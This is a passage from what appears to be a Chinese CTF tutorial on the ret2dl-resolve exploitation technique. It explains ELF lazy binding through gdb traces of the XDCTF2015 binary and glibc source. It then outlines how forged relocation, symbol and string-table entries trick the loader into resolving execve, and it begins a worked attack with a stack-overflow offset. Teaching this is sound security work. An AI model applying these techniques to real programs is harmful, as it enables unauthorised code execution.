[esp+0x10]</span><br><span class="line">                                                                  JUMP is taken</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffd594 --&gt; 0xf7ffd900 --&gt; 0x0 </span><br><span class="line">0004| 0xffffd598 --&gt; 0x20 (&apos; &apos;)</span><br><span class="line">0008| 0xffffd59c --&gt; 0x804861b (add    esp,0x10)</span><br><span class="line">0012| 0xffffd5a0 --&gt; 0x1 </span><br><span class="line">0016| 0xffffd5a4 --&gt; 0xffffd5bc (&quot;Welcome to XDCTF2015~!\n&quot;)</span><br><span class="line">0020| 0xffffd5a8 --&gt; 0x17 </span><br><span class="line">0024| 0xffffd5ac --&gt; 0x80485a4 (add    ebx,0x1a5c)</span><br><span class="line">0028| 0xffffd5b0 --&gt; 0xffffd5ea --&gt; 0x0 </span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">0x080483e6 in ?? ()</span><br></pre></td></tr></table></figure>
<p>PLT[0] 处的代码将 GOT[1] 的值压入栈中，然后跳转到 GOT[2]。这两个 GOT 表条目有着特殊的含义，动态链接器在开始时给它们填充了特殊的内容：</p>
<ul>
<li>GOT[1]：一个指向内部数据结构的指针，类型是 link_map，在动态装载器内部使用，包含了进行符号解析需要的当前 ELF 对象的信息。在它的 <code>l_info</code> 域中保存了 <code>.dynamic</code> 段中大多数条目的指针构成的一个数组，我们后面会利用它。它包含了<code>.dynamic</code>的指针，通过这个<code>link_map</code>，<code>_dl_runtime_resolve</code>函数可以访问到<code>.dynamic</code>这个section。</li>
<li>GOT[2]：一个指向动态装载器中 <code>_dl_runtime_resolve</code> 函数的指针。</li>
</ul>
<p>函数使用参数 <code>link_map_obj</code> 来获取解析导入函数（使用<code>reloc_index</code>参数标识）需要的信息，并将结果写到正确的 GOT 条目中。在 <code>_dl_runtime_resolve</code> 解析完成后，控制流就交到了那个函数手里，而下次再调用函数的 plt 时，就会直接进入目标函数中执行。</p>
<p><code>_dl-runtime-resolve</code> 的过程如下图所示：</p>
<p><img src="/Return_to_dl_resolve/1.png" alt="1"></p>
<p>重定位项使用 Elf_Rel 结构体来描述，存在于 <code>.rep.plt</code> 段和 <code>.rel.dyn</code> 段中，只不过<code>.rel.plt</code>是用于函数重定位，<code>.rel.dyn</code>是用于变量重定位。：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">typedef uint32_t Elf32_Addr;</span><br><span class="line">typedef uint32_t Elf32_Word;</span><br><span class="line"></span><br><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  Elf32_Addr    r_offset;       /* Address */</span><br><span class="line">  Elf32_Word    r_info;         /* Relocation type and symbol index */</span><br><span class="line">&#125; Elf32_Rel;</span><br><span class="line"></span><br><span class="line">typedef uint64_t Elf64_Addr;</span><br><span class="line">typedef uint64_t Elf64_Xword;</span><br><span class="line">typedef int64_t  Elf64_Sxword;</span><br><span class="line"></span><br><span class="line">typedef struct</span><br><span class="line">&#123; </span><br><span class="line">  Elf64_Addr    r_offset;       /* Address */</span><br><span class="line">  Elf64_Xword   r_info;         /* Relocation type and symbol index */</span><br><span class="line">  Elf64_Sxword  r_addend;       /* Addend */</span><br><span class="line">&#125; Elf64_Rela;</span><br></pre></td></tr></table></figure>
<p> 32 位程序使用 REL，而 64 位程序使用 RELA。</p>
<p>下面的宏描述了 r_info 是怎样被解析和插入的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/* How to extract and insert information held in the r_info field.  */</span><br><span class="line"></span><br><span class="line">#define ELF32_R_SYM(val)        ((val) &gt;&gt; 8)</span><br><span class="line">#define ELF32_R_TYPE(val)       ((val) &amp; 0xff)</span><br><span class="line">#define ELF32_R_INFO(sym, type)     (((sym) &lt;&lt; 8) + ((type) &amp; 0xff))</span><br><span class="line"></span><br><span class="line">#define ELF64_R_SYM(i)          ((i) &gt;&gt; 32)</span><br><span class="line">#define ELF64_R_TYPE(i)         ((i) &amp; 0xffffffff)</span><br><span class="line">#define ELF64_R_INFO(sym,type)      ((((Elf64_Xword) (sym)) &lt;&lt; 32) + (type))</span><br></pre></td></tr></table></figure>
<p>举个例子：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ELF32_R_SYM(Elf32_Rel-&gt;r_info) = (Elf32_Rel-&gt;r_info) &gt;&gt; 8</span><br></pre></td></tr></table></figure>
<p>每个符号使用 Elf_Sym 结构体来描述，存在于 <code>.dynsym</code> 段和 <code>.symtab</code> 段中，而 <code>.symtab</code> 在 strip 之后会被删掉：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  Elf32_Word    st_name;        /* Symbol name (string tbl index) */</span><br><span class="line">  Elf32_Addr    st_value;       /* Symbol value */</span><br><span class="line">  Elf32_Word    st_size;        /* Symbol size */</span><br><span class="line">  unsigned char st_info;        /* Symbol type and binding */</span><br><span class="line">  unsigned char st_other;       /* Symbol visibility */</span><br><span class="line">  Elf32_Section st_shndx;       /* Section index */</span><br><span class="line">&#125; Elf32_Sym;</span><br><span class="line"></span><br><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  Elf64_Word    st_name;        /* Symbol name (string tbl index) */</span><br><span class="line">  unsigned char st_info;        /* Symbol type and binding */</span><br><span class="line">  unsigned char st_other;       /* Symbol visibility */</span><br><span class="line">  Elf64_Section st_shndx;       /* Section index */</span><br><span class="line">  Elf64_Addr    st_value;       /* Symbol value */</span><br><span class="line">  Elf64_Xword   st_size;        /* Symbol size */</span><br><span class="line">&#125; Elf64_Sym;</span><br></pre></td></tr></table></figure>
<p>下面的宏描述了 st_info 是怎样被解析和插入的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/* How to extract and insert information held in the st_info field.  */</span><br><span class="line"></span><br><span class="line">#define ELF32_ST_BIND(val)      (((unsigned char) (val)) &gt;&gt; 4)</span><br><span class="line">#define ELF32_ST_TYPE(val)      ((val) &amp; 0xf)</span><br><span class="line">#define ELF32_ST_INFO(bind, type)   (((bind) &lt;&lt; 4) + ((type) &amp; 0xf))</span><br><span class="line"></span><br><span class="line">/* Both Elf32_Sym and Elf64_Sym use the same one-byte st_info field.  */</span><br><span class="line">#define ELF64_ST_BIND(val)      ELF32_ST_BIND (val)</span><br><span class="line">#define ELF64_ST_TYPE(val)      ELF32_ST_TYPE (val)</span><br><span class="line">#define ELF64_ST_INFO(bind, type)   ELF32_ST_INFO ((bind), (type))</span><br></pre></td></tr></table></figure>
<p>所以 PLT[0] 其实就是调用的以下函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_dl_runtime_resolve(link_map_obj, reloc_index)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ disassemble 0xf7fec370</span><br><span class="line">Dump of assembler code for function _dl_runtime_resolve:</span><br><span class="line">   0xf7fec370 &lt;+0&gt;:     push   eax</span><br><span class="line">   0xf7fec371 &lt;+1&gt;:     push   ecx</span><br><span class="line">   0xf7fec372 &lt;+2&gt;:     push   edx</span><br><span class="line">   0xf7fec373 &lt;+3&gt;:     mov    edx,DWORD PTR [esp+0x10]</span><br><span class="line">   0xf7fec377 &lt;+7&gt;:     mov    eax,DWORD PTR [esp+0xc]</span><br><span class="line">   0xf7fec37b &lt;+11&gt;:    call   0xf7fe6080 &lt;_dl_fixup&gt;</span><br><span class="line">   0xf7fec380 &lt;+16&gt;:    pop    edx</span><br><span class="line">   0xf7fec381 &lt;+17&gt;:    mov    ecx,DWORD PTR [esp]</span><br><span class="line">   0xf7fec384 &lt;+20&gt;:    mov    DWORD PTR [esp],eax</span><br><span class="line">   0xf7fec387 &lt;+23&gt;:    mov    eax,DWORD PTR [esp+0x4]</span><br><span class="line">   0xf7fec38b &lt;+27&gt;:    ret    0xc</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
<p>该函数在 <code>glibc/sysdeps/i386/dl-trampoline.S</code> 中用汇编实现，先保存寄存器，然后将两个值分别传入寄存器，调用 <code>_dl_fixup</code>，最后恢复寄存器：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/w $esp+0x10</span><br><span class="line">0xffffd598:     0x00000020</span><br><span class="line">gdb-peda$ x/w $esp+0xc</span><br><span class="line">0xffffd594:     0xf7ffd900</span><br></pre></td></tr></table></figure>
<p>还记得这两个值吗，一个是在 <code>&lt;write@plt+6&gt;: push 0x20</code> 中压入的偏移量，一个是 PLT[0] 中 <code>push DWORD PTR ds:0x804a004</code> 压入的 GOT[1]。</p>
<p>函数 <code>_dl_fixup(struct link_map *l, ElfW(Word) reloc_arg)</code>，其参数分别由寄存器 <code>eax</code> 和 <code>edx</code> 提供。继续调试：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ n</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0xf7ffd900 --&gt; 0x0 </span><br><span class="line">EBX: 0x804a000 --&gt; 0x8049f04 --&gt; 0x1 </span><br><span class="line">ECX: 0x2a8c </span><br><span class="line">EDX: 0x20 (&apos; &apos;)</span><br><span class="line">ESI: 0xf7f8ee28 --&gt; 0x1d1d30 </span><br><span class="line">EDI: 0xffffd620 --&gt; 0x1 </span><br><span class="line">EBP: 0xffffd638 --&gt; 0x0 </span><br><span class="line">ESP: 0xffffd588 --&gt; 0x3 </span><br><span class="line">EIP: 0xf7fec37b (&lt;_dl_runtime_resolve+11&gt;:      call   0xf7fe6080 &lt;_dl_fixup&gt;)</span><br><span class="line">EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0xf7fec372 &lt;_dl_runtime_resolve+2&gt;:  push   edx</span><br><span class="line">   0xf7fec373 &lt;_dl_runtime_resolve+3&gt;:  mov    edx,DWORD PTR [esp+0x10]</span><br><span class="line">   0xf7fec377 &lt;_dl_runtime_resolve+7&gt;:  mov    eax,DWORD PTR [esp+0xc]</span><br><span class="line">=&gt; 0xf7fec37b &lt;_dl_runtime_resolve+11&gt;: call   0xf7fe6080 &lt;_dl_fixup&gt;</span><br><span class="line">   0xf7fec380 &lt;_dl_runtime_resolve+16&gt;: pop    edx</span><br><span class="line">   0xf7fec381 &lt;_dl_runtime_resolve+17&gt;: mov    ecx,DWORD PTR [esp]</span><br><span class="line">   0xf7fec384 &lt;_dl_runtime_resolve+20&gt;: mov    DWORD PTR [esp],eax</span><br><span class="line">   0xf7fec387 &lt;_dl_runtime_resolve+23&gt;: mov    eax,DWORD PTR [esp+0x4]</span><br><span class="line">Guessed arguments:</span><br><span class="line">arg[0]: 0x3 </span><br><span class="line">arg[1]: 0x2a8c </span><br><span class="line">arg[2]: 0xffffd5bc (&quot;Welcome to XDCTF2015~!\n&quot;)</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffd588 --&gt; 0x3 </span><br><span class="line">0004| 0xffffd58c --&gt; 0x2a8c </span><br><span class="line">0008| 0xffffd590 --&gt; 0xffffd5bc (&quot;Welcome to XDCTF2015~!\n&quot;)</span><br><span class="line">0012| 0xffffd594 --&gt; 0xf7ffd900 --&gt; 0x0 </span><br><span class="line">0016| 0xffffd598 --&gt; 0x20 (&apos; &apos;)</span><br><span class="line">0020| 0xffffd59c --&gt; 0x804861b (add    esp,0x10)</span><br><span class="line">0024| 0xffffd5a0 --&gt; 0x1 </span><br><span class="line">0028| 0xffffd5a4 --&gt; 0xffffd5bc (&quot;Welcome to XDCTF2015~!\n&quot;)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">0xf7fec37b in _dl_runtime_resolve () from /lib/ld-linux.so.2</span><br><span class="line">gdb-peda$ s</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0xffffd5bc (&quot;Welcome to XDCTF2015~!\n&quot;)</span><br><span class="line">EBX: 0x804a000 --&gt; 0x8049f04 --&gt; 0x1 </span><br><span class="line">ECX: 0x2a8c </span><br><span class="line">EDX: 0x3 </span><br><span class="line">ESI: 0xf7f8ee28 --&gt; 0x1d1d30 </span><br><span class="line">EDI: 0xffffd620 --&gt; 0x1 </span><br><span class="line">EBP: 0xffffd638 --&gt; 0x0 </span><br><span class="line">ESP: 0xffffd59c --&gt; 0x804861b (add    esp,0x10)</span><br><span class="line">EIP: 0xf7ea3100 (&lt;write&gt;:       push   esi)</span><br><span class="line">EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0xf7ea30fb:  xchg   ax,ax</span><br><span class="line">   0xf7ea30fd:  xchg   ax,ax</span><br><span class="line">   0xf7ea30ff:  nop</span><br><span class="line">=&gt; 0xf7ea3100 &lt;write&gt;:  push   esi</span><br><span class="line">   0xf7ea3101 &lt;write+1&gt;:        push   ebx</span><br><span class="line">   0xf7ea3102 &lt;write+2&gt;:        sub    esp,0x14</span><br><span class="line">   0xf7ea3105 &lt;write+5&gt;:        mov    ebx,DWORD PTR [esp+0x20]</span><br><span class="line">   0xf7ea3109 &lt;write+9&gt;:        mov    ecx,DWORD PTR [esp+0x24]</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffd59c --&gt; 0x804861b (add    esp,0x10)</span><br><span class="line">0004| 0xffffd5a0 --&gt; 0x1 </span><br><span class="line">0008| 0xffffd5a4 --&gt; 0xffffd5bc (&quot;Welcome to XDCTF2015~!\n&quot;)</span><br><span class="line">0012| 0xffffd5a8 --&gt; 0x17 </span><br><span class="line">0016| 0xffffd5ac --&gt; 0x80485a4 (add    ebx,0x1a5c)</span><br><span class="line">0020| 0xffffd5b0 --&gt; 0xffffd5ea --&gt; 0x0 </span><br><span class="line">0024| 0xffffd5b4 --&gt; 0xf7ffca64 --&gt; 0x6 </span><br><span class="line">0028| 0xffffd5b8 --&gt; 0xf7ffca68 --&gt; 0x3c (&apos;&lt;&apos;)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">0xf7ea3100 in write () from /usr/lib32/libc.so.6</span><br></pre></td></tr></table></figure>
<p>即使我们使用单步进入，也不能调试 <code>_dl_fixup</code>，它直接就执行完成并跳转到 write 函数了，而此时，GOT 的地址已经被覆盖为实际地址：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/w 0x804a01c</span><br><span class="line">0x804a01c:      0xf7ea3100</span><br></pre></td></tr></table></figure>
<p>再强调一遍：fixup 是通过寄存器取参数的，这似乎违背了 32 位程序的调用约定，但它就是这样，上面 gdb 中显示的参数是错误的，该函数对程序员来说是透明的，所以会尽量少用栈去做操作。</p>
<p>既然不能调试，直接看代码吧，在 <code>glibc/elf/dl-runtime.c</code> 中：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">DL_FIXUP_VALUE_TYPE</span><br><span class="line">attribute_hidden __attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE</span><br><span class="line">_dl_fixup (</span><br><span class="line"># ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS</span><br><span class="line">	   ELF_MACHINE_RUNTIME_FIXUP_ARGS,</span><br><span class="line"># endif</span><br><span class="line">	   struct link_map *l, ElfW(Word) reloc_arg)</span><br><span class="line">&#123;</span><br><span class="line">  // 分别获取动态链接符号表和动态链接字符串表的基址</span><br><span class="line">  const ElfW(Sym) *const symtab</span><br><span class="line">    = (const void *) D_PTR (l, l_info[DT_SYMTAB]);</span><br><span class="line">  const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);</span><br><span class="line"></span><br><span class="line">  // 通过参数 reloc_arg 计算重定位入口，这里的 DT_JMPREL 即 .rel.plt，reloc_offset 即 reloc_arg</span><br><span class="line">  const PLTREL *const reloc</span><br><span class="line">    = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line">  </span><br><span class="line">  // 根据函数重定位表中的动态链接符号表索引，即 reloc-&gt;r_info，获取函数在动态链接符号表中对应的条目</span><br><span class="line">  const ElfW(Sym) *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line">  const ElfW(Sym) *refsym = sym;</span><br><span class="line">  void *const rel_addr = (void *)(l-&gt;l_addr + reloc-&gt;r_offset);</span><br><span class="line">  lookup_t result;</span><br><span class="line">  DL_FIXUP_VALUE_TYPE value;</span><br><span class="line"></span><br><span class="line">  /* Sanity check that we&apos;re really looking at a PLT relocation.  */</span><br><span class="line">  assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br><span class="line"></span><br><span class="line">   /* Look up the target symbol.  If the normal lookup rules are not</span><br><span class="line">      used don&apos;t look in the global scope.  */</span><br><span class="line">  if (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) == 0)</span><br><span class="line">    &#123;</span><br><span class="line">      const struct r_found_version *version = NULL;</span><br><span class="line"></span><br><span class="line">      if (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != NULL)</span><br><span class="line">	&#123;</span><br><span class="line">	  const ElfW(Half) *vernum =</span><br><span class="line">	    (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">	  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff;</span><br><span class="line">	  version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">	  if (version-&gt;hash == 0)</span><br><span class="line">	    version = NULL;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      /* We need to keep the scope around so do some locking.  This is</span><br><span class="line">	 not necessary for objects which cannot be unloaded or when</span><br><span class="line">	 we are not using any threads (yet).  */</span><br><span class="line">      int flags = DL_LOOKUP_ADD_DEPENDENCY;</span><br><span class="line">      if (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">	&#123;</span><br><span class="line">	  THREAD_GSCOPE_SET_FLAG ();</span><br><span class="line">	  flags |= DL_LOOKUP_GSCOPE_LOCK;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">#ifdef RTLD_ENABLE_FOREIGN_CALL</span><br><span class="line">      RTLD_ENABLE_FOREIGN_CALL;</span><br><span class="line">#endif</span><br><span class="line">      // 根据 strtab+sym-&gt;st_name 在字符串表中找到函数名，然后进行符号查找获取 libc 基址 result</span><br><span class="line">      result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,</span><br><span class="line">				    version, ELF_RTYPE_CLASS_PLT, flags, NULL);</span><br><span class="line"></span><br><span class="line">      /* We are done with the global scope.  */</span><br><span class="line">      if (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">	THREAD_GSCOPE_RESET_FLAG ();</span><br><span class="line"></span><br><span class="line">#ifdef RTLD_FINALIZE_FOREIGN_CALL</span><br><span class="line">      RTLD_FINALIZE_FOREIGN_CALL;</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">      /* Currently result contains the base load address (or link map)</span><br><span class="line">	 of the object that defines sym.  Now add in the symbol</span><br><span class="line">   offset.  */</span><br><span class="line"></span><br><span class="line">      // 将要解析的函数的偏移地址加上 libc 基址，得到函数的实际地址</span><br><span class="line">      value = DL_FIXUP_MAKE_VALUE (result,</span><br><span class="line">				   sym ? (LOOKUP_VALUE_ADDRESS (result)</span><br><span class="line">					  + sym-&gt;st_value) : 0);</span><br><span class="line">    &#125;</span><br><span class="line">  else</span><br><span class="line">    &#123;</span><br><span class="line">      /* We already found the symbol.  The module (and therefore its load</span><br><span class="line">	 address) is also known.  */</span><br><span class="line">      value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);</span><br><span class="line">      result = l;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  /* And now perhaps the relocation addend.  */</span><br><span class="line">  value = elf_machine_plt_value (l, reloc, value);</span><br><span class="line"></span><br><span class="line">  // 将已经解析完成的函数地址写入相应的 GOT 表中</span><br><span class="line">  if (sym != NULL</span><br><span class="line">      &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, 0))</span><br><span class="line">    value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));</span><br><span class="line"></span><br><span class="line">  /* Finally, fix up the plt itself.  */</span><br><span class="line">  if (__glibc_unlikely (GLRO(dl_bind_not)))</span><br><span class="line">    return value;</span><br><span class="line"></span><br><span class="line">  return elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="0x2-攻击方式："><a href="#0x2-攻击方式：" class="headerlink" title="0x2. 攻击方式："></a>0x2. 攻击方式：</h3><p>关于延迟绑定的攻击，在于强迫动态装载器解析请求的函数。</p>
<p><img src="/Return_to_dl_resolve/6.1.3_attack.png" alt="6.1.3_attack"></p>
<ul>
<li>图a中，因为动态转载器是从 <code>.dynamic</code> 段的 <code>DT_STRTAB</code> 条目中获得 <code>.dynstr</code> 段的地址的，而 <code>DT_STRTAB</code> 条目的位置已知，默认情况下也可写。所以攻击者能够改写 <code>DT_STRTAB</code> 条目的内容，欺骗动态装载器，让它以为 <code>.dynstr</code> 段在 <code>.bss</code> 段中，并在那里伪造一个假的字符串表。当它尝试解析 printf 时会使用不同的基地址来寻找函数名，最终执行的是 execve。这种方式非常简单，但仅当二进制程序的 <code>.dynamic</code> 段可写时有效。</li>
<li>图b中，我们已经知道 <code>_dl_runtime_resolve</code> 的第二个参数是 Elf_Rel 条目在 <code>.rel.plt</code> 段中的偏移，动态装载器将这个值加上 <code>.rel.plt</code> 的基址来得到目标结构体的绝对位置。然后当传递给 <code>_dl_runtime_resolve</code> 的参数 <code>reloc_index</code> 超出了 <code>.rel.plt</code> 段，并最终落在 <code>.bss</code> 段中时，攻击者可以在该位置伪造了一个 <code>Elf_Rel</code> 结构，并填写 <code>r_offset</code> 的值为一个可写的内存地址来将解析后的函数地址写在那里，同理 <code>r_info</code> 也会是一个将动态装载器导向到攻击者控制内存的下标。这个下标就指向一个位于它后面的 <code>Elf_Sym</code> 结构，而 <code>Elf_Sym</code> 结构中的 <code>st_name</code> 同样超出了 <code>.dynsym</code> 段。这样这个符号就会包含一个相对于 <code>.dynstr</code> 地址足够大的偏移使其能够达到这个符号之后的一段内存，而那段内存里保存着这个将要调用的函数的名称。</li>
</ul>
<p>还记得我们前面说过的 GOT[1]，它是一个 link_map 类型的指针，其 <code>l_info</code> 域中有一个包含 <code>.dynmic</code> 段中所有条目构成的数组。动态链接器就是利用这些指针来定位符号解析过程中使用的对象的。通过覆盖这个 link_map 的一部分，就能够将 <code>l_info</code> 域中的 <code>DT_STRTAB</code> 条目指向一个特意制造的动态条目，那里则指向一个假的动态字符串表。</p>
<p><img src="/Return_to_dl_resolve/6.1.3_link_map.png" alt="6.1.3_link_map"></p>
<h3 id="0x3-实例攻击方式："><a href="#0x3-实例攻击方式：" class="headerlink" title="0x3. 实例攻击方式："></a>0x3. 实例攻击方式：</h3><h4 id="0xa-第一种攻击方式："><a href="#0xa-第一种攻击方式：" class="headerlink" title="0xa. 第一种攻击方式："></a>0xa. 第一种攻击方式：</h4><p>首先触发栈溢出漏洞，偏移为 112：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ pattern_offset 0x41384141</span><br><span class="line">1094205761 found at offset: 112</span><br></pre></td></tr></table></figure>
